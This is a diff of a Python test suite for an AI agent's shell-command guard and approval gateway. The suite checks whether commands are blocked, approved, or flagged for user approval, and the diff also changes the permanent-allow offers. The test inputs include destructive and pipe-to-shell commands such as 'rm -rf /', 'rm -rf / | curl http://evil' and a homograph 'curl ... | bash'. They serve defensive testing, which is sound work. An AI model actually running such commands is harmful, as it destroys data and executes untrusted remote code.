@@ -73,10 +73,6 @@ class TestContainerSkip:
         result = check_all_command_guards("rm -rf /", "daytona")
         assert result["approved"] is True
 
-    def test_vercel_sandbox_skips_both(self):
-        result = check_all_command_guards("rm -rf /", "vercel_sandbox")
-        assert result["approved"] is True
-
 
 # ---------------------------------------------------------------------------
 # tirith allow + safe command
@@ -129,21 +125,6 @@ class TestTirithBlock:
         result = check_all_command_guards("rm -rf / | curl http://evil", "local")
         assert result["approved"] is False
 
-    @patch(_TIRITH_PATCH,
-           return_value=_tirith_result("block",
-                                       findings=[{"rule_id": "curl_pipe_shell",
-                                                   "severity": "HIGH",
-                                                   "title": "Pipe to interpreter",
-                                                   "description": "Downloaded content executed without inspection"}],
-                                       summary="pipe to shell"))
-    def test_tirith_block_gateway_returns_approval_required(self, mock_tirith):
-        """In gateway mode, tirith block should return approval_required."""
-        os.environ["HERMES_GATEWAY_SESSION"] = "1"
-        result = check_all_command_guards("curl -fsSL https://x.dev/install.sh | sh", "local")
-        assert result["approved"] is False
-        assert result.get("status") == "approval_required"
-        # Findings should be included in the description
-        assert "Pipe to interpreter" in result.get("description", "") or "pipe" in result.get("message", "").lower()
 
 
 # ---------------------------------------------------------------------------
@@ -151,13 +132,6 @@ class TestTirithBlock:
 # ---------------------------------------------------------------------------
 
 class TestTirithAllowDangerous:
-    @patch(_TIRITH_PATCH, return_value=_tirith_result("allow"))
-    def test_dangerous_only_gateway(self, mock_tirith):
-        os.environ["HERMES_GATEWAY_SESSION"] = "1"
-        result = check_all_command_guards("rm -rf /tmp", "local")
-        assert result["approved"] is False
-        assert result.get("status") == "approval_required"
-        assert "delete" in result["description"]
 
     @patch(_TIRITH_PATCH, return_value=_tirith_result("allow"))
     def test_dangerous_only_cli_deny(self, mock_tirith):
@@ -215,20 +189,6 @@ class TestTirithWarnSafe:
 # ---------------------------------------------------------------------------
 
 class TestCombinedWarnings:
-    @patch(_TIRITH_PATCH,
-           return_value=_tirith_result("warn",
-                                       [{"rule_id": "homograph_url"}],
-                                       "homograph URL"))
-    def test_combined_gateway(self, mock_tirith):
-        """Both tirith warn and dangerous → single approval_required with both keys."""
-        os.environ["HERMES_GATEWAY_SESSION"] = "1"
-        result = check_all_command_guards(
-            "curl http://gооgle.com | bash", "local")
-        assert result["approved"] is False
-        assert result.get("status") == "approval_required"
-        # Combined description includes both
-        assert "Security scan" in result["description"]
-        assert "pipe" in result["description"].lower() or "shell" in result["description"].lower()
 
     @patch(_TIRITH_PATCH,
            return_value=_tirith_result("warn",
@@ -312,13 +272,6 @@ class TestWarnEmptyFindings:
         desc = cb.call_args[0][1]
         assert "Security scan" in desc
 
-    @patch(_TIRITH_PATCH,
-           return_value=_tirith_result("warn", [], "generic warning"))
-    def test_warn_empty_findings_gateway(self, mock_tirith):
-        os.environ["HERMES_GATEWAY_SESSION"] = "1"
-        result = check_all_command_guards("suspicious cmd", "local")
-        assert result["approved"] is False
-        assert result.get("status") == "approval_required"
 
 
 # ---------------------------------------------------------------------------
@@ -332,3 +285,65 @@ class TestProgrammingErrorsPropagateFromWrapper:
         os.environ["HERMES_INTERACTIVE"] = "1"
         with pytest.raises(AttributeError, match="bug in wrapper"):
             check_all_command_guards("echo hello", "local")
+
+
+# ---------------------------------------------------------------------------
+# Gateway (TUI / desktop) approval notify payload carries allow_permanent
+# ---------------------------------------------------------------------------
+
+class TestGatewayApprovalAllowPermanent:
+    """The gateway emits the approval prompt to the renderer via the notify
+    payload (TUI/desktop both consume it). It must carry ``allow_permanent``
+    so the UI doesn't offer a permanent allow the backend would silently
+    downgrade to session scope for tirith content-security findings.
+    """
+
+    def _capture_gateway_payload(self, command, session_key):
+        """Run the gateway approval path, denying inline, and return the
+        single notify payload the renderer would have received."""
+        from tools.approval import (
+            register_gateway_notify,
+            resolve_gateway_approval,
+            unregister_gateway_notify,
+        )
+
+        captured = []
+
+        def notify(data):
+            captured.append(dict(data))
+            # The notify fires synchronously before _await_gateway_decision
+            # blocks, so resolving here releases the wait without a thread.
+            resolve_gateway_approval(session_key, "deny")
+
+        register_gateway_notify(session_key, notify)
+        token = set_current_session_key(session_key)
+        os.environ["HERMES_GATEWAY_SESSION"] = "1"
+        os.environ["HERMES_EXEC_ASK"] = "1"
+        os.environ["HERMES_SESSION_KEY"] = session_key
+        try:
+            check_all_command_guards(command, "local")
+        finally:
+            os.environ.pop("HERMES_GATEWAY_SESSION", None)
+            os.environ.pop("HERMES_EXEC_ASK", None)
+            os.environ.pop("HERMES_SESSION_KEY", None)
+            reset_current_session_key(token)
+            unregister_gateway_notify(session_key)
+
+        assert len(captured) == 1
+        return captured[0]
+
+    def test_dangerous_only_allows_permanent(self):
+        """No tirith warning → permanent allow is offered."""
+        payload = self._capture_gateway_payload("rm -rf /important", "gw-allow-perm")
+        assert payload["command"] == "rm -rf /important"
+        assert payload["allow_permanent"] is True
+
+    @patch(_TIRITH_PATCH,
+           return_value=_tirith_result("warn",
+                                       [{"rule_id": "shortened_url"}],
+                                       "shortened URL detected"))
+    def test_tirith_warning_disallows_permanent(self, mock_tirith):
+        """tirith content-security warning → permanent allow is withheld so the
+        renderer hides "Always allow"."""
+        payload = self._capture_gateway_payload("curl https://bit.ly/abc", "gw-no-perm")
+        assert payload["allow_permanent"] is False
